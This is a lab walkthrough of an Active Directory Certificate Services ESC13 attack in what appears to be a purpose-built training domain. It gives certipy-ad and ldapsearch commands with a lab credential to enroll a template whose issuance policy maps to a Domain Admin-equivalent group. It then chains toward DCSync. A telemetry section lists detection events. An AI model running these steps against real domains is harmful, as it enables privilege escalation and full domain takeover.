# WT#060 — ESC13: Issuance Policy Group Mapping

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | CADRE-ESC13 |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | certipy-ad |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Hard |

## Prerequisites
- CA service running on dc01
- `CADRE-ESC13` template published with an issuance policy OID
- The issuance policy OID maps to `Command-Cadre` (Domain Admins equivalent) via `msDS-OIDToGroupLink`
- `analyst_dfir` has Enroll on `CADRE-ESC13`

## Attack Steps

### 1. Enumerate issuance policy mapping
```powershell
certipy-ad find -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10 -vuln -enabled
```

### 2. Check the OID-to-group link
```powershell
ldapsearch -H ldap://192.168.77.10 -D "cadre.local\analyst_dfir" -w 'An@lyst_DF1R!' -b "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=cadre,DC=local" "(msDS-OIDToGroupLink=*)"
```

### 3. Enroll CADRE-ESC13 certificate
```powershell
certipy-ad req -ca cadre-CA -template CADRE-ESC13 -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 4. Authenticate with certificate — Kerberos includes issuance policy groups
```powershell
certipy-ad auth -pfx analyst_dfir.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

### 5. Verify elevated group membership (Command-Cadre)
```powershell
certipy-ad auth -pfx analyst_dfir.pfx -dc-ip 192.168.77.10 -domain cadre.local -ldap-shell
whoami /groups
```

## Post-Exploitation Chain
ESC13 → Certificate with mapped issuance policy → Kerberos TGT includes Command-Cadre group → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: CADRE-ESC13 enrollment by analyst_dfir
- **Event 4889**: Certificate issued with issuance policy OID in `Certificate Policies` extension
- **Event 4768**: Kerberos TGT with elevated group membership (Command-Cadre SID in PAC)
- **Event 4624**: Logon session with new group memberships
- **LDAP**: `msDS-OIDToGroupLink` attribute on the OID object
## Status
CONFIGURED — CA cadre-CA running, ESC13 issuance policy OID linked to Command-Cadre
